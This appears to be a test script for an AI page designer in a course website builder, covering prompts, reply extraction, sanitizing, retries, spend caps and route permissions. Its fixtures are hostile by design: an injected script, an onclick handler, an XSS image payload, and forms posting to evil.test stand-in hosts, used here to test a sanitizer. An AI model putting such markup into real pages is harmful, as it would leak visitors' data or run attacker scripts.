/**
 * The AI page designer for the website builder, offline.
 *
 * No provider key, no network, no database: the model is a stub that returns
 * whatever a check hands it. What is under test is everything around the model,
 * because that is where a site page goes wrong:
 *
 *  - is the model told about every variable that exists on the page it is
 *    writing, and exactly the forms that work there — the sign-in form is never
 *    advertised to a model writing an ordinary page?
 *  - is the document found inside a reply that wraps it in prose, a fence or a
 *    whole <html> page?
 *  - is a script, an `action`, an invented variable, an invented form, a remote
 *    stylesheet or a missing required form caught, and described in words?
 *  - is the correction asked for at most once, and never passed off as usable
 *    when it still is not?
 *  - can the header or footer ever carry a form that takes a password?
 *
 *   npx tsx scripts/verify-site-ai.ts
 *   npx tsx scripts/verify-site-ai.ts --ai   # plus TWO real generations
 */
import "dotenv/config";
import { readFileSync, writeFileSync } from "node:fs";
import { Agent } from "@mastra/core/agent";
import { aiStatus, DEFAULT_AI_MODEL } from "../lib/ai/config";
import { AiError } from "../lib/ai/run";
import {
  SITE_AI_MAX_PER_DAY,
  SITE_AI_MAX_PER_HOUR,
  checkSiteSource,
  cleanSiteSource,
  designSite,
  extractSiteHtml,
  processSiteReply,
  renderSitePreview,
  siteAiBudgetVerdict,
  siteDesignRequestSchema,
  unknownLoopFields,
  type SiteDesignRequest,
} from "../lib/site/ai";
import {
  MAX_REVISE_SOURCE_CHARS,
  allowedForms,
  effectiveKind,
  siteBuilderInstructions,
  siteDesignerBrief,
  siteKindGuide,
  siteVariableGuide,
  type SiteAiTarget,
  type SiteDesignContext,
} from "../lib/site/ai-guide";
import { SITE_FORMS, SITE_PAGE_KINDS, formAllowedOn, pageKindProblems, type SitePageKind } from "../lib/site/site-api";
import { sampleContext, variablesForKind, type VariableDef } from "../lib/site/variables";
import { usedVariables, type VariableContext } from "../lib/site/template";
import { sanitizeSiteDocument } from "../lib/content/sanitize-site-document";
import { kindStarter } from "../lib/site/kind-starters";
import { siteBuilderAgent } from "../src/mastra/agents/site-builder-agent";

const runLive = process.argv.includes("--ai");
// Kept aside before the offline checks clear the environment.
const realKeys = { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY, AI_MODEL: process.env.AI_MODEL };

let failed = 0;
let total = 0;

// A script that stops early prints nothing and exits 0 — which reads as a pass.
let finished = false;
process.on("exit", (code) => {
  if (!finished && code === 0) {
    console.log("\nverify-site-ai ended before its last check — treat this as a FAILURE.");
    process.exitCode = 1;
  }
});

function check(label: string, actual: unknown, expected: unknown) {
  total++;
  const a = JSON.stringify(actual);
  const e = JSON.stringify(expected);
  const ok = a === e;
  if (!ok) failed++;
  console.log(`${ok ? "PASS" : "FAIL"}  ${label}${ok ? "" : `\n      got  ${a}\n      want ${e}`}`);
}

/** Which of `needles` are missing from `haystack` — empty means all present. */
function missing(haystack: string, needles: string[]): string[] {
  return needles.filter((needle) => !haystack.includes(needle));
}
/** Which of `needles` are present in `haystack` — empty means none got through. */
function present(haystack: string, needles: string[]): string[] {
  return needles.filter((needle) => haystack.toLowerCase().includes(needle.toLowerCase()));
}
const codes = (report: { issues: { code: string }[] }) => [...new Set(report.issues.map((i) => i.code))];
const has = (report: { issues: { code: string }[] }, code: string) => report.issues.some((i) => i.code === code);

const KINDS = SITE_PAGE_KINDS.map((k) => k.kind);

/* -------------------------------------------------------------------------- */
/* Fixtures                                                                    */
/* -------------------------------------------------------------------------- */

const HOME = `<style>
  .hp { background: #fff; color: #111827; font-family: Georgia, serif; }
  .hp * { box-sizing: border-box; }
  .hp-hero { padding: 3rem 1.25rem; }
  .hp h1 { font-size: clamp(2rem, 6vw, 3.5rem); font-weight: 700; font-family: Georgia, serif; }
  .hp a:focus-visible { outline: 3px solid var(--sb-brand); }
  @media (min-width: 48rem) { .hp-grid { display: grid; grid-template-columns: repeat(3, 1fr); } }
</style>

<div class="hp">
  <section class="hp-hero">
    {{#if tenant.logoUrl}}<img src="{{ tenant.logoUrl }}" alt="">{{/if}}
    <h1>Learn with {{ tenant.name }}</h1>
    <p><a href="{{ auth.registerUrl }}">Register</a> or <a href="{{ auth.loginUrl }}">sign in</a></p>
  </section>
  <section>
    <h2>Courses</h2>
    {{#if courses}}
    <div class="hp-grid">
      {{#each courses}}
      <a href="{{ this.url }}"><h3>{{ this.title }}</h3><p>{{ this.price }}</p></a>
      {{/each}}
    </div>
    {{else}}
    <p>Our first courses are on their way.</p>
    {{/if}}
  </section>
</div>`;

const LOGIN = kindStarter("LOGIN").html;

/** The home page with everything a site page must not contain. */
const HOSTILE = HOME.replace("<style>", `<link rel="stylesheet" href="https://fonts.example.test/a.css">\n<style>\n  @import url(https://fonts.example.test/b.css);`)
  .replace(
    "<h1>",
    `<script>alert("x")</script>
    <img src="https://images.example.test/hero.jpg" alt="">
    <form action="https://evil.test/collect" data-lms-form="newsletter"><input name="email"><button>Join</button></form>
    <a href="/pricing">Pricing</a>
    <h1 onclick="steal()">`
  )
  .replace("<p>{{ this.price }}</p>", "<p>{{ this.price }} · {{ this.instructor }}</p>")
  .replace("Learn with {{ tenant.name }}", "Learn with {{ tenant.name }} — {{ tenant.motto }}");

const CONTEXT: SiteDesignContext = {
  tenantName: "Greenfield Academy",
  hasLogo: true,
  hasHeroImage: false,
  hasEmail: true,
  hasPhone: false,
  hasAddress: true,
  courseTitles: ["Intro to JavaScript", "Describing data"],
  courseCount: 2,
  programmeCount: 0,
  navTitles: ["About"],
  pageTitle: "Home",
};

/* -------------------------------------------------------------------------- */
/* A model that says what it is told to                                        */
/* -------------------------------------------------------------------------- */

type StubReply = { text?: string; finishReason?: string; error?: unknown };
const calls: { prompt: string; options: Record<string, unknown> }[] = [];
let replies: (StubReply | (() => StubReply))[] = [];

const stub = new Agent({ id: "site-builder-stub", name: "stub", instructions: "stub", model: DEFAULT_AI_MODEL });
(stub as unknown as { generate: unknown }).generate = async (
  messages: { content: string }[],
  options: Record<string, unknown>
) => {
  calls.push({ prompt: messages[0].content, options });
  const next = replies.shift();
  if (!next) throw new Error("the stub was asked for more replies than the check supplied");
  return typeof next === "function" ? next() : next;
};

const request = (target: SiteAiTarget, kind: SitePageKind, brief = "A clear, friendly page"): SiteDesignRequest =>
  siteDesignRequestSchema.parse({ mode: "create", target, kind, brief });

async function design(req: SiteDesignRequest, ...scripted: (StubReply | (() => StubReply))[]) {
  calls.length = 0;
  replies = scripted;
  try {
    return { result: await designSite(stub, req, CONTEXT), error: null as string | null };
  } catch (e) {
    return { result: null, error: e instanceof AiError ? e.code : `not an AiError: ${String(e)}` };
  }
}

async function main() {
  delete process.env.AI_MODEL;
  delete process.env.ANTHROPIC_API_KEY;
  delete process.env.OPENROUTER_API_KEY;

  /* ------------------------------------------------------------------------ */
  /* What the model is told                                                    */
  /* ------------------------------------------------------------------------ */

  const standing = siteBuilderInstructions();
  check("the agent's instructions are the generated contract", siteBuilderAgent.id, "site-builder-agent");
  check(
    "the contract forbids what the sanitizer removes and what a page cannot do",
    missing(standing, ["<script>", "event-handler", "<link>", "@import", "action", "var(--sb-brand)", "360px", ":focus-visible", "lorem ipsum", "data-lms-error"]),
    []
  );
  check(
    "the standing contract advertises no particular form: that depends on the page",
    present(standing, SITE_FORMS.map((f) => `data-lms-form="${f.kind}"`)),
    []
  );

  for (const kind of KINDS) {
    const brief = siteDesignerBrief("page", kind);
    const variables = variablesForKind(kind);
    check(
      `${kind}: the model is told every variable that exists there`,
      missing(brief, variables.map((v) => (v.kind === "list" ? `{{#each ${v.path}}}` : `{{ ${v.path} }}`))),
      []
    );
    check(
      `${kind}: …and every field of every list`,
      missing(brief, variables.flatMap((v) => (v.fields ?? []).map((f) => `{{ this.${f.name} }}`))),
      []
    );
    const guide = siteKindGuide("page", kind);
    check(
      `${kind}: exactly the forms that work there are offered as markup`,
      SITE_FORMS.filter((f) => guide.includes(`<form data-lms-form="${f.kind}"`)).map((f) => f.kind),
      SITE_FORMS.filter((f) => formAllowedOn(f, kind)).map((f) => f.kind)
    );
  }
  check(
    "variables of another kind of page are not offered on an ordinary one",
    present(siteVariableGuide("PAGE"), ["course.title", "programme.title", "catalog.query"]),
    []
  );
  check(
    "an ordinary page is never shown the markup of a form that takes a password",
    present(siteKindGuide("page", "PAGE"), ['type="password"', 'name="password"']),
    []
  );
  check(
    "a sign-in page is told its form is required, with its fields",
    missing(siteKindGuide("page", "LOGIN"), ["REQUIRED", 'data-lms-form="login"', 'named "email"', 'named "password"', "data-lms-error"]),
    []
  );

  // Generated, not typed out: a variable added to the catalogue reaches the prompt.
  const extra: VariableDef[] = [...variablesForKind("PAGE"), { path: "tenant.motto", kind: "scalar", label: "The academy's motto", sample: "Learn. Build." }];
  check("a variable added to the catalogue appears in the guide", siteVariableGuide("PAGE", extra).includes("{{ tenant.motto }}"), true);

  for (const target of ["header", "footer"] as const) {
    check(`the ${target} follows an ordinary page's rules whatever page is open`, effectiveKind(target, "LOGIN"), "PAGE");
    check(
      `the ${target} is never offered a credential form`,
      [allowedForms(effectiveKind(target, "LOGIN")).map((f) => f.kind), present(siteKindGuide(target, "LOGIN"), ['type="password"'])],
      [["search"], []]
    );
  }

  /* ------------------------------------------------------------------------ */
  /* Finding the document in a reply                                           */
  /* ------------------------------------------------------------------------ */

  check("a bare document is returned as it is", extractSiteHtml(HOME), HOME);
  check("a fenced reply is unwrapped", extractSiteHtml("Here is your page:\n\n```html\n" + HOME + "\n```\n\nLet me know!"), HOME);
  check("sentences around the document are dropped", extractSiteHtml("Sure — here it is.\n\n" + HOME + "\n\nI used your brand colour."), HOME);
  check(
    "a whole HTML document is reduced to its styles and body",
    extractSiteHtml(`<!doctype html><html><head><title>Home</title><meta charset="utf-8">\n<style>.a{color:red}</style></head>\n<body>\n<div class="a">Hi</div>\n</body></html>`),
    `<style>.a{color:red}</style>\n\n<div class="a">Hi</div>`
  );
  const headerStart = `{{#if user.isAuthenticated}}\n<a href="{{ auth.dashboardUrl }}">Dashboard</a>\n{{else}}\n<a href="{{ auth.loginUrl }}">Sign in</a>\n{{/if}}`;
  check("a document that opens and closes with a template tag keeps both", extractSiteHtml("Here:\n" + headerStart + "\nDone."), headerStart);
  check("a reply with no markup yields nothing", extractSiteHtml("I'm sorry, I can't help with that."), "");

  /* ------------------------------------------------------------------------ */
  /* Cleaning                                                                  */
  /* ------------------------------------------------------------------------ */

  const cleanedHome = cleanSiteSource(HOME, "PAGE");
  check("a good page cleans without losing a template tag", [cleanedHome.cleaned, missing(cleanedHome.html, usedVariables(HOME))], [true, []]);
  check(
    "…and renders exactly as it did",
    renderSitePreview(cleanedHome.html, "PAGE", sampleContext() as VariableContext).html.replace(/\s+/g, " "),
    renderSitePreview(HOME, "PAGE", sampleContext() as VariableContext).html.replace(/\s+/g, " ")
  );
  const cleanedHostile = cleanSiteSource(HOSTILE, "PAGE").html;
  check(
    "what the sanitizer would remove is removed from the source too",
    present(cleanedHostile, ["<script", "onclick", "@import", "<link", "evil.test", "<form"]),
    []
  );
  check("the search box's address is the platform's, not written into the source",
    present(cleanSiteSource(SITE_FORMS.find((f) => f.kind === "search")!.example, "PAGE").html, ["action=", "method="]), []);

  /* ------------------------------------------------------------------------ */
  /* Checking                                                                  */
  /* ------------------------------------------------------------------------ */

  const good = processSiteReply(HOME, { target: "page", kind: "PAGE" });
  check("a good home page has nothing to fix and can be applied", [good.report.blocked, good.report.issues.filter((i) => i.severity !== "info")], [false, []]);

  const hostile = processSiteReply(HOSTILE, { target: "page", kind: "PAGE" });
  const hostileText = hostile.report.issues.map((i) => i.message).join("\n");
  check("a hostile reply is blocked", hostile.report.blocked, true);
  check(
    "…and each problem is caught by name",
    missing(codes(hostile.report).join(","), ["dead_form", "unknown_variable", "unknown_field", "sanitized", "remote_asset", "invented_link"]),
    []
  );
  check(
    "…and described: the script, the stylesheet link, the import, the handler, the form, the variables, the link",
    missing(hostileText, ["<script>", "<link>", "@import", "onclick", 'data-lms-form="newsletter"', "{{ tenant.motto }}", "{{ this.instructor }}", "images.example.test", "/pricing"]),
    []
  );
  check("the invented variable and field are listed", [hostile.report.unknownVariables, hostile.report.unknownFields.length], [["tenant.motto"], 1]);

  const withAction = processSiteReply(LOGIN.replace('data-lms-form="login"', 'data-lms-form="login" action="https://evil.test/x"'), { target: "page", kind: "LOGIN" });
  check("an action on a real form is removed and said to be", [withAction.html.includes("evil.test"), withAction.report.removed.some((r) => r.includes("action"))], [false, true]);

  const loginOk = processSiteReply(LOGIN, { target: "page", kind: "LOGIN" });
  check("the sign-in starter passes as a sign-in page", [loginOk.report.blocked, loginOk.report.kindProblems], [false, []]);

  const loginNoForm = processSiteReply(HOME, { target: "page", kind: "LOGIN" });
  check("a sign-in page with no sign-in form is blocked, as not publishable", [loginNoForm.report.blocked, has(loginNoForm.report, "not_publishable")], [true, true]);

  const loginOnHome = processSiteReply(HOME.replace("<h2>Courses</h2>", LOGIN.replace(/<style>[\s\S]*?<\/style>/, "")), { target: "page", kind: "PAGE" });
  check("a sign-in form on an ordinary page is a dead form, and blocked", [loginOnHome.report.blocked, has(loginOnHome.report, "dead_form"), loginOnHome.html.includes('type="password"')], [true, true, false]);

  for (const target of ["header", "footer"] as const) {
    const r = processSiteReply(LOGIN, { target, kind: "LOGIN" });
    check(`a credential form in the ${target} is refused even while the sign-in page is open`, [r.report.blocked, r.html.includes('type="password"'), r.html.includes('data-lms-form="login"')], [true, false, false]);
  }

  check(
    "a field the platform does not accept is pointed out",
    has(processSiteReply(LOGIN.replace('name="email"', 'name="username"'), { target: "page", kind: "LOGIN" }).report, "unknown_field_name"),
    true
  );
  check(
    "a sign-in form with nowhere to show an error is pointed out",
    has(processSiteReply(LOGIN.replace("<p data-lms-error></p>", ""), { target: "page", kind: "LOGIN" }).report, "no_error_slot"),
    true
  );
  check(
    "a learner's email in an attribute is pointed out",
    has(checkSiteSource('<div class="x"><a href="/?e={{ user.email }}">me</a></div>', { target: "page", kind: "PAGE" }), "personal_data"),
    true
  );
  check(
    "a header with no way to sign in or register is pointed out",
    has(checkSiteSource('<div><a href="/">{{ tenant.name }}</a></div>', { target: "header", kind: "PAGE" }), "no_account_links"),
    true
  );
  check(
    "a catalogue that lists no courses, and a course page that names no course, are pointed out",
    [has(checkSiteSource("<div><h1>Courses</h1></div>", { target: "page", kind: "COURSES" }), "no_course_list"),
     has(checkSiteSource("<div><h1>Course</h1></div>", { target: "page", kind: "COURSE_DETAIL" }), "no_course")],
    [true, true]
  );
  check(
    "loop fields are checked against the list being looped over",
    unknownLoopFields("{{#each courses}}{{ this.title }}{{ this.teacher }}{{/each}}{{ this.title }}", variablesForKind("PAGE")).length,
    2
  );
  check("an empty reply is an error, not a page", [checkSiteSource("", { target: "page", kind: "PAGE" }).blocked, codes(checkSiteSource("", { target: "page", kind: "PAGE" }))], [true, ["empty"]]);

  for (const def of SITE_PAGE_KINDS) {
    if (def.kind === "PAGE") continue;
    const r = processSiteReply(kindStarter(def.kind).html, { target: "page", kind: def.kind });
    check(`the ${def.kind} starter survives the whole pipeline unblocked, with nothing removed`, [r.report.blocked, r.report.removed, r.report.unknownVariables, r.report.unknownFields], [false, [], [], []]);
  }

  /* ------------------------------------------------------------------------ */
  /* The request                                                               */
  /* ------------------------------------------------------------------------ */

  check("a brief is required", siteDesignRequestSchema.safeParse({ mode: "create", target: "page", kind: "PAGE", brief: " " }).success, false);
  check("an unknown target or kind is refused", [
    siteDesignRequestSchema.safeParse({ mode: "create", target: "sidebar", kind: "PAGE", brief: "abc" }).success,
    siteDesignRequestSchema.safeParse({ mode: "create", target: "page", kind: "CHECKOUT", brief: "abc" }).success,
  ], [false, false]);
  check("a document too long to revise is refused before any call", siteDesignRequestSchema.safeParse({ mode: "revise", target: "page", kind: "PAGE", instruction: "shorter", currentHtml: "x".repeat(MAX_REVISE_SOURCE_CHARS + 1) }).success, false);

  /* ------------------------------------------------------------------------ */
  /* The whole job, with the stub                                              */
  /* ------------------------------------------------------------------------ */

  const notConfigured = await design(request("page", "PAGE"), { text: HOME });
  check("with no provider key nothing is sent to a model", [notConfigured.error, calls.length], ["not_configured", 0]);

  process.env.ANTHROPIC_API_KEY = "sk-ant-offline-check";

  const first = await design(request("page", "PAGE"), { text: "```html\n" + HOME + "\n```" });
  check("a good reply takes one call", [first.error, first.result?.attempts, first.result?.report.blocked, calls.length], [null, 1, false, 1]);
  check(
    "the request carries the page's own guide, the academy's facts and the brief, fenced as material",
    missing(calls[0].prompt, ["WHAT YOU ARE WRITING", "VARIABLES AVAILABLE HERE", "Greenfield Academy", "Intro to JavaScript", "<<<WHAT_IS_WANTED", "A clear, friendly page"]),
    []
  );
  check("no sampling parameters are sent", present(JSON.stringify(calls[0].options), ["temperature", "topP", "topK"]), []);

  const repaired = await design(request("page", "LOGIN"), { text: HOME }, { text: LOGIN });
  check("an unpublishable sign-in page gets one correction, and the better answer wins", [repaired.result?.attempts, repaired.result?.report.blocked, calls.length], [2, false, 2]);
  check("the correction names the problem and carries the page's rules again", missing(calls[1]?.prompt ?? "", ["cannot be used yet", "sign-in form", 'data-lms-form="login"', "<<<YOUR_DOCUMENT"]), []);

  const stillBad = await design(request("page", "LOGIN"), { text: HOME }, { text: HOME });
  check("the correction is asked for once only, and a page that still cannot be published says so", [stillBad.result?.attempts, stillBad.result?.report.blocked, has(stillBad.result!.report, "not_publishable"), calls.length], [2, true, true, 2]);

  const repairFails = await design(request("page", "PAGE"), { text: HOSTILE }, () => {
    throw Object.assign(new Error("Overloaded"), { statusCode: 529 });
  });
  check("a failed correction never costs the first answer", [repairFails.error, repairFails.result?.attempts, Boolean(repairFails.result?.html)], [null, 2, true]);

  const headerLogin = await design(request("header", "LOGIN"), { text: LOGIN }, { text: `<div><a href="/">{{ tenant.name }}</a> <a href="{{ auth.loginUrl }}">Sign in</a> <a href="{{ auth.registerUrl }}">Register</a></div>` });
  check("a header is designed under an ordinary page's rules", [headerLogin.result?.kind, headerLogin.result?.report.blocked, calls[0].prompt.includes('type="password"')], ["PAGE", false, false]);

  const revise = await design(siteDesignRequestSchema.parse({ mode: "revise", target: "page", kind: "PAGE", instruction: "Make the heading shorter", currentHtml: HOME }), { text: HOME });
  check("a revision sends the current document and the change, fenced", missing(calls[0].prompt, ["<<<REQUESTED_CHANGE", "Make the heading shorter", "<<<CURRENT_DOCUMENT", "Learn with {{ tenant.name }}"]), []);
  check("…and returns it checked", revise.result?.report.blocked, false);

  const prose = await design(request("page", "PAGE"), { text: "I can't write that page." });
  check("a reply with no markup is a failed call, not an empty page", prose.error, "invalid_output");
  const cutOff = await design(request("page", "PAGE"), { text: HOME.slice(0, 300), finishReason: "length" });
  check("a reply cut off at the output limit is reported as cut off", cutOff.error, "truncated");
  const noCredit = await design(request("page", "PAGE"), () => {
    throw Object.assign(new Error("Your credit balance is too low"), { statusCode: 400 });
  });
  check("a provider failure is reported by its real cause", noCredit.error, "credits");

  /* ------------------------------------------------------------------------ */
  /* Preview and spend                                                         */
  /* ------------------------------------------------------------------------ */

  const preview = renderSitePreview(HOSTILE, "PAGE", { ...sampleContext(), user: { name: '<img src=x onerror="alert(1)">', email: "", isAuthenticated: true } } as VariableContext);
  check("the preview is sanitized like the live page", present(`${preview.html}${preview.css}`, ["<script", "onclick=", "@import", "<form", "evil.test"]), []);
  check("…and scoped", [preview.scope.length > 0, sanitizeSiteDocument(HOME, "x").css.includes("data-css-scope")], [true, true]);
  check("a published sign-in design still has to pass the platform's own check", pageKindProblems("LOGIN", renderSitePreview(LOGIN, "LOGIN", sampleContext() as VariableContext).html), []);

  check(
    "the spend cap allows up to the limit and refuses past it, hourly and daily",
    [
      siteAiBudgetVerdict({ lastHour: 0, lastDay: 0 }),
      siteAiBudgetVerdict({ lastHour: SITE_AI_MAX_PER_HOUR - 1, lastDay: SITE_AI_MAX_PER_DAY - 1 }),
      typeof siteAiBudgetVerdict({ lastHour: SITE_AI_MAX_PER_HOUR, lastDay: SITE_AI_MAX_PER_HOUR }),
      typeof siteAiBudgetVerdict({ lastHour: 0, lastDay: SITE_AI_MAX_PER_DAY }),
    ],
    [null, null, "string", "string"]
  );

  /* ------------------------------------------------------------------------ */
  /* The route                                                                 */
  /* ------------------------------------------------------------------------ */

  const route = readFileSync("app/api/tenant/site/ai/generate/route.ts", "utf8");
  check(
    "the route checks CSRF, the site-editing permission, AI setup and the spend cap before the model",
    missing(route, ["requireCsrf(request)", "TENANT_SITE_WRITE", "requireAiConfigured()", "enforceBudget(actor.tenantId)", "aiDomainError(", '"site.ai_design"']),
    []
  );
  check(
    "…in that order",
    ["requireCsrf(request)", "requireTenantActor(", "requireAiConfigured()", "await enforceBudget(", "designSite("]
      .map((needle) => route.lastIndexOf(needle))
      .every((position, index, all) => position > -1 && (index === 0 || position > all[index - 1])),
    true
  );
  check("the route never writes a page or the layout: applying and saving stay with the person",
    present(route, ["sitePage.update", "sitePage.create", "sitePage.upsert", "siteLayout.upsert", "siteLayout.update"]), []);
  check("the page's stored kind wins over the one the browser sent", route.includes("page ? page.kind : body.kind"), true);

  /* ------------------------------------------------------------------------ */
  /* Two real generations (optional)                                           */
  /* ------------------------------------------------------------------------ */

  if (runLive) {
    if (realKeys.AI_MODEL) process.env.AI_MODEL = realKeys.AI_MODEL;
    if (realKeys.ANTHROPIC_API_KEY) process.env.ANTHROPIC_API_KEY = realKeys.ANTHROPIC_API_KEY;
    else delete process.env.ANTHROPIC_API_KEY;

    const status = aiStatus();
    if (!status.configured) {
      console.log(`\n(skipped the live generations — set ${status.keyEnvVar} in .env to include them)`);
    } else {
      const jobs: [string, SiteDesignRequest][] = [
        ["login", request("page", "LOGIN", "A calm, centred sign-in page with our logo and a short welcome")],
        ["home", request("page", "PAGE", "A home page: a confident opening about learning with us, our courses, and a clear invitation to register")],
      ];
      for (const [name, req] of jobs) {
        console.log(`\nAsking ${status.model} for a ${name} page…`);
        const started = Date.now();
        try {
          const live = await designSite(siteBuilderAgent, req, CONTEXT);
          console.log(`      ${((Date.now() - started) / 1000).toFixed(1)}s, ${live.attempts} call(s), ${live.html.length} characters`);
          // To look at what it made: SITE_AI_DUMP=path/prefix  → prefix-login.html, prefix-home.html
          if (process.env.SITE_AI_DUMP) writeFileSync(`${process.env.SITE_AI_DUMP}-${name}.html`, live.html);
          for (const issue of live.report.issues) console.log(`      ${issue.severity}: ${issue.message}`);
          check(`live ${name}: can be published`, [live.report.blocked, live.report.kindProblems], [false, []]);
          check(`live ${name}: uses only real variables and fields`, [live.report.unknownVariables, live.report.unknownFields], [[], []]);
          check(`live ${name}: nothing for the sanitizer to remove`, live.report.removed, []);
          check(`live ${name}: loads nothing from another website`, live.report.remoteHosts, []);
        } catch (e) {
          check(`live ${name}: the generation completed`, e instanceof AiError ? `${e.code}: ${e.detail}` : String(e), "no error");
        }
      }
    }
  } else {
    console.log("\n(skipped the live generations — pass --ai to make two real calls)");
  }

  finished = true;
  console.log(failed === 0 ? `\nAll ${total} site AI checks passed.` : `\n${failed} of ${total} check(s) FAILED.`);
  process.exit(failed === 0 ? 0 : 1);
}

main().catch((e) => {
  console.error("verify-site-ai crashed:", e);
  process.exit(1);
});
